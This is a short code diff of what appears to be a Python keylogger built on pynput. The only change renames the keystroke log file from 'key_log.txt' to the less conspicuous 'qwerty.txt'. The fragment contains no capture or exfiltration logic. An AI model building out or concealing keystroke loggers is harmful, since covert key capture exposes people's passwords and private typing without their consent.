@@ -1,7 +1,7 @@
 from pynput import keyboard
 
 # File where logs will be saved
-log_file = "key_log.txt"
+log_file = "qwerty.txt"
 
 def on_press(key):
     try:
